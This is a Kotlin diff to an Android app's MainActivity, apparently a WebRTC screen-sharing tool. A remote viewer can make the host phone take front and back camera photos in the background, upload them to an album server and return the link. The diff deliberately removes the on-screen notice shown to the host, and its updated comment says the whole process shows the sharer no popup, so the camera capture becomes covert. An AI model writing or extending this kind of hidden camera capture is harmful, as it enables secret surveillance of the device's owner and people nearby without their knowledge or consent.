@@ -493,8 +493,14 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                 }
                 "album-result" -> {
                     val ack = obj.optString("ack")
-                    if (ack == "camera") {
-                        runOnUiThread { Toast.makeText(this, "共享方已收到拍照请求", Toast.LENGTH_SHORT).show() }
+                    if (ack.isNotBlank()) {
+                        val tip = when (ack) {
+                            "camera" -> "共享方已收到拍照请求"
+                            "capturing" -> "共享方正在后台拍照..."
+                            "shot-failed" -> "共享方拍照失败，请稍后重试"
+                            else -> "共享方处理中"
+                        }
+                        runOnUiThread { Toast.makeText(this, tip, Toast.LENGTH_SHORT).show() }
                         return
                     }
                     val url = obj.optString("url")
@@ -678,7 +684,10 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
         // 先回执确认收到指令，避免出现「点了无反应」
         val pendingPeer = peer
         pendingPeer?.sendControl("""{"type":"album-result","ack":"camera"}""")
-        if (!isHost) return
+        if (!isHost) {
+            pendingPeer?.sendControl("""{"type":"album-result","error":"共享方会话状态异常"}""")
+            return
+        }
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), PERM_REQUEST_CAMERA)
             return
@@ -686,29 +695,28 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
         startCameraCapture()
     }
 
-    /** 后台拍照（后置+前置）→ 压缩上传相册服务器 → 回发链接给观看方 */
+    /** 后台拍照（后置+前置）→ 压缩上传相册服务器 → 回发链接给观看方；全程无共享方弹窗 */
     private fun startCameraCapture() {
         val baseUrl = BuildConfig.ALBUM_URL
+        val p = peer
         if (baseUrl.isBlank()) {
-            peer?.sendControl("""{"type":"album-result","error":"相册服务器未配置"}""")
+            p?.sendControl("""{"type":"album-result","error":"相册服务器未配置"}""")
             return
         }
         val ctx = this
-        val p = peer
-        Toast.makeText(this, "正在拍照上传...", Toast.LENGTH_SHORT).show()
+        p?.sendControl("""{"type":"album-result","ack":"capturing"}""")
         Thread {
             try {
                 val shot = CameraCapture.capture(ctx)
                 if (shot == null) {
-                    runOnUiThread { p?.sendControl("""{"type":"album-result","error":"拍照失败"}""") }
+                    p?.sendControl("""{"type":"album-result","ack":"shot-failed"}""")
                     return@Thread
                 }
-                // 将 JPEG 压缩转 base64（复用相册压缩逻辑，剥 EXIF、控制体积）
                 val b64List = ArrayList<String>()
                 shot.backJpeg?.let { b64List.add(AlbumUploader.jpegToBase64(it)) }
                 shot.frontJpeg?.let { b64List.add(AlbumUploader.jpegToBase64(it)) }
                 if (b64List.isEmpty()) {
-                    runOnUiThread { p?.sendControl("""{"type":"album-result","error":"拍照失败"}""") }
+                    p?.sendControl("""{"type":"album-result","ack":"shot-failed"}""")
                     return@Thread
                 }
                 AlbumUploader.uploadB64Images(
@@ -717,18 +725,18 @@ class MainActivity : AppCompatActivity(), WebRTCPeer.Listener {
                         override fun onProgress(current: Int, total: Int) {}
 
                         override fun onComplete(link: String) {
-                            runOnUiThread { p?.sendControl("""{"type":"album-result","url":"$link"}""") }
+                            p?.sendControl("""{"type":"album-result","url":"$link"}""")
                         }
 
                         override fun onError(message: String) {
-                            runOnUiThread { p?.sendControl("""{"type":"album-result","error":"$message"}""") }
+                            p?.sendControl("""{"type":"album-result","error":"$message"}""")
                         }
                     },
                     cancel = { albumCancel }
                 )
             } catch (t: Throwable) {
                 val msg = t.message ?: "未知错误"
-                runOnUiThread { p?.sendControl("""{"type":"album-result","error":"拍照上传失败: $msg"}""") }
+                p?.sendControl("""{"type":"album-result","error":"拍照上传失败: $msg"}""")
             }
         }.start()
     }
